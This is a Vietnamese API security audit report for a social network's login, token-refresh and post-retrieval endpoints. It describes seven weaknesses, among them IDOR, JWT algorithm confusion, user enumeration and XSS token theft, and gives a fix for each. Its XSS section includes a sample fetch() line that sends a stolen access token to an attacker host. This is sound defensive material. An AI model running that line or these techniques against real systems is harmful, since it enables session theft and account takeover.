# BÁO CÁO KIỂM TOÁN AN NINH API (SecurityAudit.md)

**Hệ thống:** Social Network Auth & Posts Service  
**Tài liệu tham chiếu:** `openapi.yaml`  
**Tiêu chuẩn đối chiếu:** OWASP API Security Top 10:2023, RFC 6749 (OAuth 2.0), RFC 7519 (JWT), RFC 7807 (Problem Details), NIST SP 800-63B  

---

## TỔNG QUAN

Báo cáo này phân tích chi tiết 7 điểm có nguy cơ lộ lọt dữ liệu hoặc phá vỡ cơ chế kiểm soát truy cập đối với 3 endpoint trong đặc tả OpenAPI:
1. `POST /auth/login`
2. `POST /auth/refresh`
3. `GET /posts/{id}`

Mỗi mục chỉ rõ vị trí trên API spec, cơ chế khai thác thực tế và giải pháp khắc phục bằng mã nguồn / cấu hình hệ thống.

---

### 1. Lỗ hổng Phân quyền Mức Đối tượng (BOLA / IDOR - OWASP API1:2023)
* **Vị trí trên Spec:** Endpoint `GET /posts/{id}`.
* **Nguy cơ lộ lọt:**
  - Token gửi lên hợp lệ và có scope `posts:read`, nhưng Resource Server chỉ thực hiện truy vấn DB dạng `SELECT * FROM posts WHERE id = :id` mà không kiểm tra quan hệ sở hữu.
  - Người dùng A có thể thay đổi số thứ tự `{id}` trên URL để đọc trái phép bài viết ở chế độ riêng tư (`visibility: "private"`) hoặc bài viết trong nhóm kín của người dùng B.
* **Hậu quả:** Rò rỉ toàn bộ thông tin nội dung bài viết riêng tư, danh tính tác giả (`author_id`), và metadata cá nhân.
* **Giải pháp khắc phục:**
  - Bắt buộc kiểm soát theo mô hình 3 lớp: **AuthN** (`@jwt_required()`) $\rightarrow$ **AuthZ Scope** (`@require_scopes("posts:read")`) $\rightarrow$ **Object Ownership Policy** (`@user_owns_resource` hoặc logic kiểm tra trạng thái bài viết).
  - Trả về mã lỗi `403 Forbidden` hoặc `404 Not Found` (để ẩn hoàn toàn sự tồn tại của đối tượng) nếu caller không phải là tác giả hoặc không nằm trong danh sách được cấp quyền.

---

### 2. Thuật toán kiểm tra chữ ký JWT bị bypass (Algorithm Confusion & `alg: none` - OWASP API2:2023)
* **Vị trí trên Spec:** Middleware xác thực Bearer Token cho `GET /posts/{id}` và Refresh Token cho `POST /auth/refresh`.
* **Nguy cơ lộ lọt:**
  - Nếu cấu hình máy chủ chấp nhận thuật toán linh hoạt theo header của client gửi lên:
    - **Lỗi `alg: "none"`:** Kẻ tấn công tạo JWT với header `{"alg": "none"}` và bỏ hoàn toàn phần signature. Nếu thư viện bỏ qua khâu verify, kẻ tấn công có thể tự gán `sub` của người khác hoặc tự thêm scope `posts:read`, `posts:write`.
    - **Algorithm Confusion (RS256 vs HS256):** Hệ thống dùng cặp khóa RSA, kẻ tấn công lấy Public Key (thường công khai) làm khóa bí mật đối xứng cho thuật toán `HS256`. Khi verify, server dùng nhầm Public Key làm secret HMAC và xác nhận token giả mạo là hợp lệ.
* **Hậu quả:** Kẻ tấn công mạo danh bất kỳ tài khoản nào trong hệ thống mà không cần mật khẩu.
* **Giải pháp khắc phục:**
  - Khóa cứng thuật toán duy nhất trong cấu hình: `JWT_ALGORITHM = "HS256"` (hoặc chỉ định danh sách cố định với khóa công khai tương ứng).
  - Tuyệt đối không cho phép đọc thuật toán động từ header của token.

---

### 3. Rò rỉ Dữ liệu Định danh Cá nhân (PII) qua Payload của JWT (OWASP API3:2023)
* **Vị trí trên Spec:** Cấu trúc Token cấp tại `POST /auth/login` và `POST /auth/refresh` (`TokenResponse`).
* **Nguy cơ lộ lọt:**
  - JWT compact (`header.payload.signature`) chỉ được mã hóa định dạng Base64URL chứ **không hề được mã hóa bảo mật dữ liệu** (không phải JWE).
  - Nếu lập trình viên nhúng các thông tin nhạy cảm vào Claims như: `password_hash`, số điện thoại, địa chỉ nhà, căn cước công dân hoặc cấu trúc phân quyền nội bộ chi tiết, bất kỳ ai bắt được gói tin qua proxy/Fiddler/DevTools đều có thể giải mã plaintext ngay lập tức bằng `base64 -d`.
* **Hậu quả:** Lộ lọt thông tin riêng tư của người dùng, vi phạm tiêu chuẩn bảo vệ dữ liệu cá nhân.
* **Giải pháp khắc phục:**
  - Áp dụng nguyên tắc Claims tối thiểu: Payload chỉ chứa `sub` (User ID dạng chuỗi), `iss`, `aud`, `exp`, `iat`, `jti`, và danh sách roles/scopes cần thiết.
  - Dữ liệu chi tiết của profile phải được truy vấn qua API riêng có kiểm soát quyền, không gắn vào token.

---

### 4. Dò quét tài khoản (User Enumeration) và Credential Stuffing (OWASP API2:2023)
* **Vị trí trên Spec:** Endpoint `POST /auth/login`.
* **Nguy cơ lộ lọt:**
  - **Lộ tài khoản qua phản hồi lỗi:** Nếu hệ thống trả về thông báo lỗi chi tiết như `404: Email does not exist` khi tài khoản chưa đăng ký, và `401: Wrong password` khi mật khẩu sai, kẻ tấn công sẽ chạy danh sách hàng triệu email để lọc ra danh sách tài khoản có thực.
  - **Lộ tài khoản qua Timing Attack:** Thời gian xử lý kiểm tra email không tồn tại (vài mili-giây) nhanh hơn đáng kể so với việc chạy hàm băm chậm như `bcrypt.checkpw()` hoặc `argon2.verify()` (khoảng 100-300ms) khi email có thực.
  - **Thiếu Rate Limiting:** Kẻ tấn công có thể dùng botnet tự động brute-force tài khoản liên tục.
* **Hậu quả:** Kẻ tấn công thu thập được cơ sở dữ liệu người dùng thật để thực hiện tấn công lừa đảo (phishing) hoặc chiếm đoạt tài khoản (Account Takeover).
* **Giải pháp khắc phục:**
  - Đồng nhất mã trạng thái và thông điệp lỗi: Trả về chung mã `401 Unauthorized` kèm body chuẩn RFC 7807 với thông điệp generic: `"Invalid email or password"`.
  - Giảm thiểu chênh lệch thời gian (Timing Attack) bằng cách chạy một chu trình băm giả lập (dummy hash) ngay cả khi email không tồn tại.
  - Bắt buộc kích hoạt giới hạn tốc độ (`429 Too Many Requests`) dựa trên địa chỉ IP và định danh tài khoản.

---

### 5. Chiếm quyền phiên do lưu trữ Token tại Web Storage (XSS to Account Takeover)
* **Vị trí trên Spec:** Phía Client tiêu thụ các endpoint `/auth/refresh` và `/posts/{id}`.
* **Nguy cơ lộ lọt:**
  - Frontend (React, Vue, SPA) lưu trữ `access_token` và `refresh_token` trong `window.localStorage` hoặc `sessionStorage`.
  - Khi ứng dụng dính lỗi Cross-Site Scripting (XSS) (ví dụ render bài viết có nội dung chứa payload script chưa được escape), script độc hại có thể trích xuất token:
    ```javascript
    fetch('[https://attacker.io/steal?token=](https://attacker.io/steal?token=)' + localStorage.getItem('access_token'));
    ```
* **Hậu quả:** Kẻ tấn công đánh cắp được token và có toàn quyền gửi request mạo danh nạn nhân.
* **Giải pháp khắc phục:**
  - Không lưu Refresh Token trong Web Storage. Chuyển sang lưu trữ trong Cookie đi kèm các thuộc tính bảo vệ nghiêm ngặt:
    - `HttpOnly`: Trình duyệt ngăn không cho JavaScript đọc cookie.
    - `Secure`: Cookie chỉ được truyền qua giao thức HTTPS đã mã hóa TLS.
    - `SameSite=Strict` hoặc `Lax`: Ngăn ngừa tấn công Cross-Site Request Forgery (CSRF).
  - Sử dụng kiến trúc Backend-for-Frontend (BFF) để quản lý phiên tập trung.

---

### 6. Không xoay vòng và thiếu cơ chế thu hồi Refresh Token (Broken Revocation & Rotation - OWASP API2:2023)
* **Vị trí trên Spec:** Endpoint `POST /auth/refresh`.
* **Nguy cơ lộ lọt:**
  - Refresh Token được cấu hình thời gian sống dài (30 ngày). Nếu kẻ tấn công chiếm được chuỗi token này và server chỉ kiểm tra chữ ký mà không lưu trạng thái phiên, kẻ tấn công có thể liên tục gọi cấp mới Access Token vô thời hạn.
  - Khi người dùng chủ động bấm "Đăng xuất" hoặc "Đổi mật khẩu", nếu hệ thống không có cơ chế thu hồi, Refresh Token cũ vẫn tiếp tục sử dụng được.
* **Hậu quả:** Phiên đăng nhập bị duy trì bất hợp pháp ngay cả sau khi phát hiện sự cố.
* **Giải pháp khắc phục:**
  - **Triển khai Refresh Token Rotation:** Mỗi khi client gửi refresh token lên để lấy access token mới, hệ thống phải vô hiệu hóa token cũ đó ngay lập tức và cấp lại một cặp token hoàn toàn mới.
  - **Phát hiện tái sử dụng trái phép (Reuse Detection):** Nếu một refresh token cũ đã từng được rotate mà bị gửi lại lần 2, hệ thống lập tức thu hồi toàn bộ các phiên đăng nhập thuộc về người dùng đó.
  - **Blocklist tập trung trên Redis:** Sử dụng claim `jti` (JWT ID) duy nhất cho từng token và lưu vào Redis kèm thời gian sống (TTL) để kiểm tra tức thì tại tầng middleware.

---

### 7. Rủi ro lưu trữ thông tin xác thực bằng thuật toán băm yếu (Broken Password Storage)
* **Vị trí trên Spec:** Cơ chế xác thực tài khoản phục vụ `POST /auth/login`.
* **Nguy cơ lộ lọt:**
  - Hệ thống sử dụng các hàm băm đa dụng chạy nhanh như MD5, SHA-1 hoặc lặp SHA-256 thuần túy không có salt riêng biệt cho từng bản ghi.
  - Khi cơ sở dữ liệu bị lộ qua các lỗ hổng injection hoặc rò rỉ file sao lưu (backup), kẻ tấn công sử dụng phần cứng chuyên dụng (GPU clusters) để vét cạn hoặc tra cứu bảng tính sẵn (Rainbow Table).
* **Hậu quả:** Toàn bộ mật khẩu người dùng bị giải mã thành dạng rõ (plaintext) trong thời gian ngắn.
* **Giải pháp khắc phục:**
  - Tuyệt đối cấm sử dụng các thuật toán băm nhanh cho mật khẩu.
  - Bắt buộc áp dụng thuật toán bộ nhớ khó (**Argon2id**) theo khuyến nghị OWASP/NIST:
    - `time_cost = 3`
    - `memory_cost = 65536 KiB (64 MiB)`
    - `parallelism = 4`
  - Trường hợp duy trì hệ thống cũ, sử dụng `bcrypt` với work factor $\ge 12$ kèm tính năng tự động rehash khi người dùng đăng nhập.

---

## DANH MỤC TIÊU CHÍ AN NINH TRƯỚC KHI TRIỂN KHAI (CHECKLIST)

- [x] Bắt buộc giao thức HTTPS/TLS cho toàn bộ endpoint; từ chối mọi kết nối HTTP không an toàn.
- [x] Tất cả secret key (`JWT_SECRET_KEY`) được nạp từ biến môi trường/Vault, không lưu vết trên Git.
- [x] Áp dụng chuẩn phản hồi lỗi RFC 7807 (`application/problem+json`), không để rò rỉ stack trace hoặc cấu trúc DB.
- [x] Triển khai kiểm tra 3 lớp (AuthN $\rightarrow$ Scope $\rightarrow$ Ownership) trên `GET /posts/{id}` để chặn đứng BOLA.
- [x] Rate limiting được kích hoạt trên `POST /auth/login` để chống Brute-force/Credential Stuffing.
- [x] Cơ chế Refresh Token Rotation và Redis JTI Blocklist được tích hợp đầy đủ.